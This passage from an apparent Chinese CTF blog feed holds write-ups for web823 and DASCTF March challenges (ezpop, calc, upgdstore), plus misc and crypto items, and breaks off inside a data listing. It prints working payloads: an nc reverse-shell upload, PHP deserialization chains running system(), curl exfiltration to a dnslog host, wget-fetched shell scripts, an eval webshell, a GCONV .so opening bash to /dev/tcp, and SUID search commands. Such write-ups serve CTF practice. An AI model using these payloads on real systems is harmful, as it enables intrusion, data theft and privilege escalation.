getShell(payload):data&#x3D;&#123;&quot;cmd&quot;:payload&#125;file &#x3D; &#123;&quot;file&quot;:b&quot;#!&#x2F;bin&#x2F;sh\nnc ip 5001 -e &#x2F;bin&#x2F;sh&quot;&#125;requests.post(url,data&#x3D;data,files&#x3D;file)print(&quot;[*] Attack success!!!&quot;)def run():getShell(&quot;. &#x2F;t*&#x2F;*&quot;)def main():run()if __name__ &#x3D;&#x3D; &#39;__main__&#39;:main()</code></pre><p>反弹shell</p><h2 id="web823"><a href="#web823" class="headerlink" title="web823"></a>web823</h2><p>5字符可写，有dir</p><p>很厉害的思路，把index.php改写成.index</p><p>还是有群主的脚本</p><pre class="line-numbers language-python"><code class="language-python"><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>dasctf三月赛复现</title>
      <link href="/2022/03/30/dasctf%E4%B8%89%E6%9C%88%E8%B5%9B%E5%A4%8D%E7%8E%B0/"/>
      <url>/2022/03/30/dasctf%E4%B8%89%E6%9C%88%E8%B5%9B%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><p>感觉这次的题不是很难，不至于像之前那样复现都复现不了，不过自己还是太菜了，web只出了一个，这里主要是复现一下web方面</p><h2 id="ezpop"><a href="#ezpop" class="headerlink" title="ezpop"></a>ezpop</h2><p>确实是一个简单的php</p><pre class="language-none"><code class="language-none">&lt;?phpclass crow&#123;    public $v1;    public $v2;    function eval() &#123;        echo new $this-&gt;v1($this-&gt;v2);    &#125;    public function __invoke()    &#123;        $this-&gt;v1-&gt;world();    &#125;&#125;class fin&#123;    public $f1;    public function __destruct()&#x2F;&#x2F;反序列化的入口    &#123;        echo $this-&gt;f1 . &#39;114514&#39;;    &#125;    public function run()    &#123;        ($this-&gt;f1)();    &#125;    public function __call($a, $b)    &#123;        echo $this-&gt;f1-&gt;get_flag();    &#125;&#125;class what&#123;    public $a;    public function __toString()    &#123;        $this-&gt;a-&gt;run();        return &#39;hello&#39;;    &#125;&#125;class mix&#123;    public $m1;    public function run()    &#123;        ($this-&gt;m1)();    &#125;    public function get_flag()    &#123;        eval(&#39;#&#39; . $this-&gt;m1);    &#125;&#125;if (isset($_POST[&#39;cmd&#39;])) &#123;    unserialize($_POST[&#39;cmd&#39;]);&#125; else &#123;    highlight_file(__FILE__);&#125;</code></pre><p>完整的反序列化链为</p><pre class="language-none"><code class="language-none">fin::destruct-&gt;what::tostring-&gt;mix::run-&gt;crow::invoke-&gt;fin::call-&gt;mix:get_flag</code></pre><p>在get_flag函数里可以利用换行符来防止自己的命令被其中的井号注释，达到命令执行的目的</p><pre class="language-none"><code class="language-none">class crow&#123;    public $v1;    public $v2;&#125;class fin&#123;    public $f1;&#125;class what&#123;    public $a;&#125;class mix&#123;    public $m1;    public function get_flag()    &#123;        eval(&#39;#&#39; . $this-&gt;m1);    &#125;&#125;$a &#x3D; new fin();$a -&gt;f1 &#x3D; new what();$a -&gt;f1-&gt;a &#x3D; new mix();$a -&gt;f1-&gt;a-&gt;m1 &#x3D; new crow();$a -&gt;f1-&gt;a-&gt;m1-&gt;v1 &#x3D; new fin();$a -&gt;f1-&gt;a-&gt;m1-&gt;v1-&gt;f1 &#x3D; new mix();$a -&gt;f1-&gt;a-&gt;m1-&gt;v1-&gt;f1-&gt;m1 &#x3D; &quot;%0a;system(&#39;ls&#39;);&quot;;echo serialize($a);&#x2F;&#x2F;O:3:&quot;fin&quot;:1:&#123;s:2:&quot;f1&quot;;O:4:&quot;what&quot;:1:&#123;s:1:&quot;a&quot;;O:3:&quot;mix&quot;:1:&#123;s:2:&quot;m1&quot;;O:4:&quot;crow&quot;:2:&#123;s:2:&quot;v1&quot;;O:3:&quot;fin&quot;:1:&#123;s:2:&quot;f1&quot;;O:3:&quot;mix&quot;:1:&#123;s:2:&quot;m1&quot;;s:17:&quot;%0a;system(&#39;ls&#39;);&quot;;&#125;&#125;s:2:&quot;v2&quot;;N;&#125;&#125;&#125;&#125;</code></pre><p>因为我这里是用的%0a，应该是解析的时候把它变成了\n，所以这个值的长度其实是要比反序列化出的长度要少1</p><p>最终payload：</p><pre class="language-none"><code class="language-none">O:3:&quot;fin&quot;:1:&#123;s:2:&quot;f1&quot;;O:4:&quot;what&quot;:1:&#123;s:1:&quot;a&quot;;O:3:&quot;mix&quot;:1:&#123;s:2:&quot;m1&quot;;O:4:&quot;crow&quot;:2:&#123;s:2:&quot;v1&quot;;O:3:&quot;fin&quot;:1:&#123;s:2:&quot;f1&quot;;O:3:&quot;mix&quot;:1:&#123;s:2:&quot;m1&quot;;s:16:&quot;%0a;system(&#39;ls&#39;);&quot;;&#125;&#125;s:2:&quot;v2&quot;;N;&#125;&#125;&#125;&#125;然后cat读文件O:3:&quot;fin&quot;:1:&#123;s:2:&quot;f1&quot;;O:4:&quot;what&quot;:1:&#123;s:1:&quot;a&quot;;O:3:&quot;mix&quot;:1:&#123;s:2:&quot;m1&quot;;O:4:&quot;crow&quot;:2:&#123;s:2:&quot;v1&quot;;O:3:&quot;fin&quot;:1:&#123;s:2:&quot;f1&quot;;O:3:&quot;mix&quot;:1:&#123;s:2:&quot;m1&quot;;s:162:&quot;%0a;system(&#39;cat H0mvz850A.php H0mvz850B.php H0mvz850C.php H0mvz850D.php H0mvz850E.php H0mvz850F.php H0mvz850G.php H0mvz850q.php H0mvz850z.php flag.php index.php&#39;);&quot;;&#125;&#125;s:2:&quot;v2&quot;;N;&#125;&#125;&#125;&#125;</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/dasctf%E4%B8%89%E6%9C%88/image-20220330135920958.png"></p><h2 id="calc"><a href="#calc" class="headerlink" title="calc"></a>calc</h2><p>app.py</p><pre class="language-none"><code class="language-none">#coding&#x3D;utf-8from flask import Flask,render_template,url_for,render_template_string,redirect,request,current_app,session,abort,send_from_directoryimport randomfrom urllib import parseimport osfrom werkzeug.utils import secure_filenameimport timeapp&#x3D;Flask(__name__)def waf(s):    blacklist &#x3D; [&#39;import&#39;,&#39;(&#39;,&#39;)&#39;,&#39; &#39;,&#39;_&#39;,&#39;|&#39;,&#39;;&#39;,&#39;&quot;&#39;,&#39;&#123;&#39;,&#39;&#125;&#39;,&#39;&amp;&#39;,&#39;getattr&#39;,&#39;os&#39;,&#39;system&#39;,&#39;class&#39;,&#39;subclasses&#39;,&#39;mro&#39;,&#39;request&#39;,&#39;args&#39;,&#39;eval&#39;,&#39;if&#39;,&#39;subprocess&#39;,&#39;file&#39;,&#39;open&#39;,&#39;popen&#39;,&#39;builtins&#39;,&#39;compile&#39;,&#39;execfile&#39;,&#39;from_pyfile&#39;,&#39;config&#39;,&#39;local&#39;,&#39;self&#39;,&#39;item&#39;,&#39;getitem&#39;,&#39;getattribute&#39;,&#39;func_globals&#39;,&#39;__init__&#39;,&#39;join&#39;,&#39;__dict__&#39;]    flag &#x3D; True    for no in blacklist:        if no.lower() in s.lower():            flag&#x3D; False            print(no)            break    return flag    @app.route(&quot;&#x2F;&quot;)def index():    &quot;欢迎来到SUctf2022&quot;    return render_template(&quot;index.html&quot;)@app.route(&quot;&#x2F;calc&quot;,methods&#x3D;[&#39;GET&#39;])def calc():    ip &#x3D; request.remote_addr    num &#x3D; request.values.get(&quot;num&quot;)    log &#x3D; &quot;echo &#123;0&#125; &#123;1&#125; &#123;2&#125;&gt; .&#x2F;tmp&#x2F;log.txt&quot;.format(time.strftime(&quot;%Y%m%d-%H%M%S&quot;,time.localtime()),ip,num)        if waf(num):        try:            data &#x3D; eval(num)            os.system(log)        except:            pass        return str(data)    else:        return &quot;waf!!&quot;    if __name__ &#x3D;&#x3D; &quot;__main__&quot;:    app.run(host&#x3D;&#39;0.0.0.0&#39;,port&#x3D;5000)  </code></pre><p>对输入的内容先当作python语句执行，然后再执行log</p><p>比赛的时候想的是绕过然后ssti注入，但是过滤的实在太多了</p><p>所以只能放弃ssti来想对os.system的利用</p><p>因为log = &quot;echo {0} {1} {2}&gt; ./tmp/log.txt&quot;.format(time.strftime(&quot;%Y%m%d-%H%M%S&quot;,time.localtime()),ip,num)</p><p>也就是说它会把这些内容输出存到log.txt里</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/dasctf%E4%B8%89%E6%9C%88/image-20220330140603838.png" alt="image-20220330140603838"></p><p>本地尝试一下可以发现，如果echo 里用反引号加命令是可以执行的，而执行的结果会输入到log.txt中</p><p>但是如果我们直接将</p><pre class="language-none"><code class="language-none">num&#x3D;&#96;ls&#96;</code></pre><p>输入，就会导致前边的eval函数报错，也就不会执行后面的system了。所以这时候我们就要利用井号来进行注释</p><p>#再python中作为注释符来使用，但是在Linux中只有在句首的位置才能当作注释</p><p>我们可以利用这个特性来实现对eval的绕过</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/dasctf%E4%B8%89%E6%9C%88/image-20220330150930650.png" alt="image-20220330150930650"></p><p>#将后边的值都注释了，也就不会让eval报错了</p><p>而对于Linux</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/dasctf%E4%B8%89%E6%9C%88/image-20220330151054801.png" alt="image-20220330151054801"></p><p>既然井号可以绕过eval来执行我们的命令，那我们再试试能不能利用通配符直接读flag（这里其实应该先外带log.txt的内容看flag在的文件名的，但是复现的时候忘了</p><pre class="language-none"><code class="language-none">http:&#x2F;&#x2F;95b2c2f7-fe16-46a0-bdf8-81f18ab7b14e.node4.buuoj.cn:81&#x2F;calc?num&#x3D;7%23&#96;curl%09\&#96;cat%09*1*\&#96;.locsor.dnslog.cn&#96;</code></pre><p>成功了</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/dasctf%E4%B8%89%E6%9C%88/image-20220330144115215.png" alt="image-20220330144115215"></p><p>但是显然因为dnslog一次只能带一条信息，而|又被ban掉了，不能利用sed来看其他的文件，所以猜到flag的难度很大，所以我们可以用wget来让靶机反弹shell</p><p>1.sh就是一个正常的反弹shell的语句</p><pre class="language-none"><code class="language-none">&#x2F;calc?num&#x3D;7%23&#96;wget%09-P%09&#x2F;var%09http:&#x2F;&#x2F;ip&#x2F;1.sh&#96;</code></pre><p>给一个可执行权限</p><pre class="language-none"><code class="language-none">&#x2F;calc?num&#x3D;7*7%23&#96;chmod%09777%09&#x2F;var&#x2F;1.sh&#96; </code></pre><p>然后执行</p><pre class="language-none"><code class="language-none">&#x2F;calc?num&#x3D;7*7%23&#96;&#x2F;var&#x2F;1.sh&#96; </code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/dasctf%E4%B8%89%E6%9C%88/image-20220330145346259.png" alt="image-20220330145346259"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/dasctf%E4%B8%89%E6%9C%88/image-20220330145646941.png" alt="image-20220330145646941"></p><p>拿到flag，和dnslog外带的结果一样</p><h2 id="upgdstore"><a href="#upgdstore" class="headerlink" title="upgdstore"></a>upgdstore</h2><p>只能传php，但是传php又会被过滤</p><p>这里把Content-Type改成image/jpeg就能绕过</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/dasctf%E4%B8%89%E6%9C%88/image-20220330212538985.png" alt="image-20220330212538985"></p><p>eval应该是被过滤了，传马传不上去，可以先传个phpinfo()看看</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/dasctf%E4%B8%89%E6%9C%88/image-20220330212709209.png" alt="image-20220330212709209"></p><p>第一次见这么多的disable_functions</p><p>但是show_source，file_get_contents没被ban，可以用这个读取源码</p><pre class="language-none"><code class="language-none">&lt;?php(&#39;sho&#39;.&#39;w_source&#39;)(&quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php&quot;);&#x2F;&#x2F;这里拼接绕过是因为这个函数是被放了黑名单里了?&gt;</code></pre><p>index.php</p><pre class="language-none"><code class="language-none">HTTP&#x2F;1.1 200 OKServer: openrestyDate: Sat, 26 Mar 2022 09:01:18 GMTContent-Type: text&#x2F;html; charset&#x3D;UTF-8Content-Length: 1695Connection: closeVary: Accept-Encoding&lt;div class&#x3D;&quot;light&quot;&gt;&lt;span class&#x3D;&quot;glow&quot;&gt;&lt;form enctype&#x3D;&quot;multipart&#x2F;form-data&quot; method&#x3D;&quot;post&quot; onsubmit&#x3D;&quot;return checkFile()&quot;&gt;    嘿伙计，传个火？！    &lt;input class&#x3D;&quot;input_file&quot; type&#x3D;&quot;file&quot; name&#x3D;&quot;upload_file&quot;&#x2F;&gt;    &lt;input class&#x3D;&quot;button&quot; type&#x3D;&quot;submit&quot; name&#x3D;&quot;submit&quot; value&#x3D;&quot;upload&quot;&#x2F;&gt;&lt;&#x2F;form&gt;&lt;&#x2F;span&gt;&lt;span class&#x3D;&quot;flare&quot;&gt;&lt;&#x2F;span&gt;&lt;div&gt;&lt;?phpfunction fun($var): bool&#123;    $blacklist &#x3D; [&quot;\$_&quot;, &quot;eval&quot;,&quot;copy&quot; ,&quot;assert&quot;,&quot;usort&quot;,&quot;include&quot;, &quot;require&quot;, &quot;$&quot;, &quot;^&quot;, &quot;~&quot;, &quot;-&quot;, &quot;%&quot;, &quot;*&quot;,&quot;file&quot;,&quot;fopen&quot;,&quot;fwriter&quot;,&quot;fput&quot;,&quot;copy&quot;,&quot;curl&quot;,&quot;fread&quot;,&quot;fget&quot;,&quot;function_exists&quot;,&quot;dl&quot;,&quot;putenv&quot;,&quot;system&quot;,&quot;exec&quot;,&quot;shell_exec&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,&quot;proc_close&quot;, &quot;proc_get_status&quot;,&quot;checkdnsrr&quot;,&quot;getmxrr&quot;,&quot;getservbyname&quot;,&quot;getservbyport&quot;, &quot;syslog&quot;,&quot;popen&quot;,&quot;show_source&quot;,&quot;highlight_file&quot;,&quot;&#96;&quot;,&quot;chmod&quot;];    foreach($blacklist as $blackword)&#123;        if(strstr($var, $blackword)) return True;&#x2F;&#x2F;strstr大小写敏感，所以可以用大写绕过这个黑名单    &#125;        return False;&#125;error_reporting(0);&#x2F;&#x2F;设置上传目录define(&quot;UPLOAD_PATH&quot;, &quot;.&#x2F;uploads&quot;);$msg &#x3D; &quot;Upload Success!&quot;;if (isset($_POST[&#39;submit&#39;])) &#123;$temp_file &#x3D; $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];$file_name &#x3D; $_FILES[&#39;upload_file&#39;][&#39;name&#39;];$ext &#x3D; pathinfo($file_name,PATHINFO_EXTENSION);if(!preg_match(&quot;&#x2F;php&#x2F;i&quot;, strtolower($ext)))&#123;die(&quot;只要好看的php&quot;);&#125;$content &#x3D; file_get_contents($temp_file);if(fun($content))&#123;    die(&quot;诶，被我发现了吧&quot;);&#125;$new_file_name &#x3D; md5($file_name).&quot;.&quot;.$ext;        $img_path &#x3D; UPLOAD_PATH . &#39;&#x2F;&#39; . $new_file_name;        if (move_uploaded_file($temp_file, $img_path))&#123;            $is_upload &#x3D; true;        &#125; else &#123;            $msg &#x3D; &#39;Upload Failed!&#39;;            die();        &#125;        echo &#39;&lt;div style&#x3D;&quot;color:#F00&quot;&gt;&#39;.$msg.&quot; Look here~ &quot;.$img_path.&quot;&lt;&#x2F;div&gt;&quot;;&#125;</code></pre><p>既然要绕过disable_functions,我们就要想到利用so文件</p><p><a href="https://blog.csdn.net/qq_42303523/article/details/117911859">使用GCONV_PATH与iconv进行bypass disable_functions_lesion__的博客-CSDN博客</a></p><p>但是在so文件中有些符号会被这个文件上传页面的黑名单过滤</p><p>所以这里我们要采用自己写一个文件上传的无黑名单的页面来绕过</p><p>1.php</p><pre class="language-none"><code class="language-none">PGRpdiBjbGFzcz0ibGlnaHQiPjxzcGFuIGNsYXNzPSJnbG93Ij4KPGZvcm0gZW5jdHlwZT0ibXVsdGlwYXJ0L2Zvcm0tZGF0YSIgbWV0aG9kPSJwb3N0IiBvbnN1Ym1pdD0icmV0dXJuIGNoZWNrRmlsZSgpIj4KICAgIOWYv+S8meiuoe+8jOS8oOS4queBq++8n++8gQogICAgPGlucHV0IGNsYXNzPSJpbnB1dF9maWxlIiB0eXBlPSJmaWxlIiBuYW1lPSJ1cGxvYWRfZmlsZSIvPgogICAgPGlucHV0IGNsYXNzPSJidXR0b24iIHR5cGU9InN1Ym1pdCIgbmFtZT0ic3VibWl0IiB2YWx1ZT0idXBsb2FkIi8+CjwvZm9ybT4KPC9zcGFuPjxzcGFuIGNsYXNzPSJmbGFyZSI+PC9zcGFuPjxkaXY+Cjw&#x2F;cGhwCmVycm9yX3JlcG9ydGluZygwKTsKLy&#x2F;orr7nva7kuIrkvKDnm67lvZUKZGVmaW5lKCJVUExPQURfUEFUSCIsICIvdG1wIik7CiRtc2cgPSAiVXBsb2FkIFN1Y2Nlc3MhIjsKaWYgKGlzc2V0KCRfUE9TVFsnc3VibWl0J10pKSB7CiR0ZW1wX2ZpbGUgPSAkX0ZJTEVTWyd1cGxvYWRfZmlsZSddWyd0bXBfbmFtZSddOwokZmlsZV9uYW1lID0gJF9GSUxFU1sndXBsb2FkX2ZpbGUnXVsnbmFtZSddOwokZXh0ID0gcGF0aGluZm8oJGZpbGVfbmFtZSxQQVRISU5GT19FWFRFTlNJT04pOwovL3h4eHh4CiRjb250ZW50ID0gZmlsZV9nZXRfY29udGVudHMoJHRlbXBfZmlsZSk7CgokbmV3X2ZpbGVfbmFtZSA9ICRmaWxlX25hbWU7CiAgICAgICAgJGltZ19wYXRoID0gVVBMT0FEX1BBVEggLiAnLycgLiAkbmV3X2ZpbGVfbmFtZTsKICAgICAgICBpZiAobW92ZV91cGxvYWRlZF9maWxlKCR0ZW1wX2ZpbGUsICRpbWdfcGF0aCkpewogICAgICAgICAgICAkaXNfdXBsb2FkID0gdHJ1ZTsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAkbXNnID0gJ1VwbG9hZCBGYWlsZWQhJzsKICAgICAgICAgICAgZGllKCk7CiAgICAgICAgfQogICAgICAgIGVjaG8gJzxkaXYgc3R5bGU9ImNvbG9yOiNGMDAiPicuJG1zZy4iIExvb2sgaGVyZX4gIi4kaW1nX3BhdGguIjwvZGl2PiI7Cn0Kbase64解码后实际的内容&lt;div class&#x3D;&quot;light&quot;&gt;&lt;span class&#x3D;&quot;glow&quot;&gt;&lt;form enctype&#x3D;&quot;multipart&#x2F;form-data&quot; method&#x3D;&quot;post&quot; onsubmit&#x3D;&quot;return checkFile()&quot;&gt;    嘿伙计，传个火？！    &lt;input class&#x3D;&quot;input_file&quot; type&#x3D;&quot;file&quot; name&#x3D;&quot;upload_file&quot;&#x2F;&gt;    &lt;input class&#x3D;&quot;button&quot; type&#x3D;&quot;submit&quot; name&#x3D;&quot;submit&quot; value&#x3D;&quot;upload&quot;&#x2F;&gt;&lt;&#x2F;form&gt;&lt;&#x2F;span&gt;&lt;span class&#x3D;&quot;flare&quot;&gt;&lt;&#x2F;span&gt;&lt;div&gt;&lt;?phperror_reporting(0);&#x2F;&#x2F;设置上传目录define(&quot;UPLOAD_PATH&quot;, &quot;&#x2F;tmp&quot;);$msg &#x3D; &quot;Upload Success!&quot;;if (isset($_POST[&#39;submit&#39;])) &#123;$temp_file &#x3D; $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];$file_name &#x3D; $_FILES[&#39;upload_file&#39;][&#39;name&#39;];$ext &#x3D; pathinfo($file_name,PATHINFO_EXTENSION);&#x2F;&#x2F;xxxxx$content &#x3D; file_get_contents($temp_file);$new_file_name &#x3D; $file_name;        $img_path &#x3D; UPLOAD_PATH . &#39;&#x2F;&#39; . $new_file_name;        if (move_uploaded_file($temp_file, $img_path))&#123;            $is_upload &#x3D; true;        &#125; else &#123;            $msg &#x3D; &#39;Upload Failed!&#39;;            die();        &#125;        echo &#39;&lt;div style&#x3D;&quot;color:#F00&quot;&gt;&#39;.$msg.&quot; Look here~ &quot;.$img_path.&quot;&lt;&#x2F;div&gt;&quot;;&#125;</code></pre><p>同时我们还要串一个一句话木马来包含这个文件，使这段base64加密的东西可以被解析</p><pre class="language-none"><code class="language-none">&lt;?phpEval(base64_decode(&#39;ZXZhbCgkX1BPU1RbJ2EnXSk&#x3D;&#39;).&#39;;&#39;);&#x2F;&#x2F;注意eval里的分号是要拼接上去，而不是直接加上?&gt;</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/dasctf%E4%B8%89%E6%9C%88/image-20220331195013802.png" alt="image-20220331195013802"></p><p>//实际上这里做题的时候经常报错，但是用get方法取值就没问题,所以我下面都用的get的一句话木马</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/dasctf%E4%B8%89%E6%9C%88/image-20220331202127030.png" alt="image-20220331202127030"></p><p>再利用include和php://filter来让之前我们写的页面的代码执行</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/dasctf%E4%B8%89%E6%9C%88/image-20220331195651892.png" alt="image-20220331195651892"></p><pre class="language-none"><code class="language-none">a&#x3D;include(base64_decode(&#39;cGhwOi8vZmlsdGVyL2NvbnZlcnQuYmFzZTY0LWRlY29kZS9yZXNvdXJjZT05YmMwOWVlNGUwZWI5MTg0MGY3YzUyMDdlMWQ4NDg1Mi5waHA&#x3D;&#39;));里面这段base64加密的内容是php:&#x2F;&#x2F;filter&#x2F;convert.base64-decode&#x2F;resource&#x3D;9bc09ee4e0eb91840f7c5207e1d84852.php</code></pre><p>现在我们就可以根据<a href="https://blog.csdn.net/qq_42303523/article/details/117911859">使用GCONV_PATH与iconv进行bypass disable_functions_lesion__的博客-CSDN博客</a></p><p>这篇文章里的东西进行提交了</p><p>首先是gconv-modules文件</p><pre class="language-none"><code class="language-none">module  自定义字符集名字（大写）&#x2F;&#x2F;    INTERNAL    ..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;自定义字符集名字（小写）    2module  INTERNAL    自定义字符集名字（大写）&#x2F;&#x2F;    ..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;自定义字符集名字（小写）    2根据题目我们可以改成aamodule  A&#x2F;&#x2F;    INTERNAL    ..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;a    2module  INTERNAL    A&#x2F;&#x2F;    ..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;a    2</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/dasctf%E4%B8%89%E6%9C%88/image-20220331202853421.png" alt="image-20220331202853421"></p><p>然后是so文件</p><pre class="language-none"><code class="language-none">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;void gconv() &#123;&#125;void gconv_init() &#123;  system(&quot;希望执行的命令&quot;);&#125;我们可以写成#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;void gconv() &#123;&#125;void gconv_init() &#123;  system(&quot;bash -c &#39;exec bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port 0&gt;&amp;1&#39;&quot;);&#125;</code></pre><p>然后编译</p><pre class="language-none"><code class="language-none">gcc 源代码文件名.c -o 自定义字符集名.so -shared -fPIC</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/dasctf%E4%B8%89%E6%9C%88/image-20220331203826312.png" alt="image-20220331203826312"></p><p>上传</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/dasctf%E4%B8%89%E6%9C%88/image-20220331203859731.png" alt="image-20220331203859731"></p><p>然后书写shell.php</p><pre class="language-none"><code class="language-none">&lt;?php    putenv(&quot;GCONV_PATH&#x3D;&#x2F;tmp&#x2F;&quot;);    iconv(&quot;自定义字符集名&quot;, &quot;UTF-8&quot;, &quot;whatever&quot;);?&gt;</code></pre><p>我们就直接传参</p><pre class="language-none"><code class="language-none">a&#x3D;putenv(&quot;GCONV_PATH&#x3D;&#x2F;tmp&#x2F;&quot;);include(&#39;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.iconv.a.utf-8&#x2F;resource&#x3D;&#x2F;tmp&#x2F;a.so&#39;);</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/dasctf%E4%B8%89%E6%9C%88/image-20220331205203233.png" alt="image-20220331205203233"></p><p>shell弹出来了</p><p>但是要访问flag文件权限不够</p><p>suid提权<a href="http://t.zoukankan.com/appear001-p-12059158.html">Linux提权-suid提权 - 走看看 (zoukankan.com)</a></p><p>find / -user root -perm -4000 -print 2&gt;/dev/null</p><p>这步不知道为什么我没有复现成功，只输出了三个值就卡住了</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/dasctf%E4%B8%89%E6%9C%88/image-20220331205416767.png" alt="image-20220331205416767"></p><p>但是可以用别的命令看看</p><pre class="language-bash" data-language="bash"><code class="language-bash">find &#x2F;bin -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;nullfind &#x2F;usr -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;nullfind &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/dasctf%E4%B8%89%E6%9C%88/image-20220331205820325.png" alt="image-20220331205820325"></p><p>最后就是看到nl有权限，用nl读取flag就行</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/dasctf%E4%B8%89%E6%9C%88/image-20220331205546901.png" alt="image-20220331205546901"></p><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="月圆之夜"><a href="#月圆之夜" class="headerlink" title="月圆之夜"></a>月圆之夜</h2><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/dasctf%E4%B8%89%E6%9C%88/image-20220331214556905.png" alt="image-20220331214556905"></p><p><a href="https://www.bilibili.com/video/BV1rL4y1T7fb?spm_id_from=333.337.search-card.all.click">我破译了神级彩蛋！这款游戏竟然藏了这么多剧情？《月圆之夜》究竟讲了什么故事？_单机游戏热门视频 (bilibili.com)</a></p><p>B站有解密的，对着找就行</p><h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="FlowerCipher"><a href="#FlowerCipher" class="headerlink" title="FlowerCipher"></a>FlowerCipher</h2><pre class="language-none"><code class="language-none"># python3from secret import flagimport random# flag &#x3D; b&#39;flag&#123;%s&#125;&#39; % md5(something).hexdigest()# note that md5 only have characters &#39;abcdef&#39; and digitsdef Flower(x, key):    flower &#x3D; random.randint(0, 4096)    return x * (key ** 3 + flower)flag &#x3D; flag[5:-1]rounds &#x3D; len(flag)L, R &#x3D; 1, 0for i in range(rounds):    L, R &#x3D; R + Flower(L, flag[i]), Lprint(L, R)&#39;&#39;&#39;15720197268945348388429429351303006925387388927292304717594511259390194100850889852747653387197205392431053069043632340374252629529419776874410817927770922310808632581666181899 139721425176294317602347104909475448503147767726747922243703132013053043430193232376860554749633894589164137720010858254771905261753520854314908256431590570426632742469003&#39;&#39;&#39;</code></pre><p>加密方式就是把flag的字符转成md5然后再转成ascii码后套在Flower函数里计算，然后对RL重新赋值，这样的R其实就 是前一个L的值，而实际上L = 上一个R + 上一个L乘上(key ** 3 + flower)，</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/dasctf%E4%B8%89%E6%9C%88/image-20220331215625510.png" alt="image-20220331215625510"></p><p>显然 L1 * (key ** 3 + flower)是能被L1整除的，而R1不行</p><p>所以L2/L1的余数就是L2</p><p>这样我们可以得到所有的L和R</p><pre class="language-none"><code class="language-none">R &#x3D; &#123;0: 139721425176294317602347104909475448503147767726747922243703132013053043430193232376860554749633894589164137720010858254771905261753520854314908256431590570426632742469003, 1: 935298420671754230833014738849730432588169238033228173469583131476419084794695511761146278309606770027490667271610796624269392034586175088396235641537756093736185366, 2: 7402968320895532116930768370098929764678065093602516751185225609968053961398195671796668035067389408306736179462173593882795916384659802649189800851665219198361, 3: 41491807647864532203061547188977816042392604608090542687445179257686072390683442091157724792609311622180322599523073162631870961894947012137520634996058265, 4: 363542281260527120641507826394376579427002124891256726811704925452455933892306777570036028677323021255266880206017499363363356743613369155668503557061, 5: 3038050870004975946934828279229998090001629942971672705946371743686684953534372767609080560274203027849883925292484330032865963662762987021572213, 6: 3121683903445470016877317983137081025437455800044243487676152297523129079630621593231064333666220053742946978640516933836161839706107832842, 7: 16713517279670522179142602316669021266414545548551242366498025076135157482269671171234675566764239156725485371108735804221489129242235, 8: 17728566345779292838907909381612640668036643431117165902908905722221490552536570008262521006387722966311695266888986102760148482, 9: 18822751726365286700612339826340137082689797360168751039458371318582478795225200597245268849966216725478600774872948579145, 10: 19346619488865481717482094100686681292384530125288986759529832156605546935716879938892385301891033660176897469426477, 11: 19304497076225869711849746340455541612339463403087957113496859433662333338211557279788474751973335123601723351, 12: 19287157921091613716265688246942013055491723611322575658962386161345041119412098008892719335475158074595, 13: 163194634853135239779527687110852732238802459017066087158243026833107794785760861815584881897662446, 14: 973825402922208545745882895848854992390620148165434035074196392656950555217820068399921894085, 15: 6028609474886885541605763758989943967354486126474121155263363791803356933057570965004061, 16: 5830376668137452804173383567980586211563348379884185911787096393298400138955904511, 17: 32759342090485149698017824597983901673872922475506121132811189377165700630061, 18: 241267801518963217329803327254141129383508497053892152707957403620167975, 19: 240324048977128823416619126180138745528644638124733113619292984561, 20: 1501209023627137765492979001172871435243212151481455508796928, 21: 11731219952144596819377276074864534430521345582519171825, 22: 11050144307727113700681557772687121323224647867153, 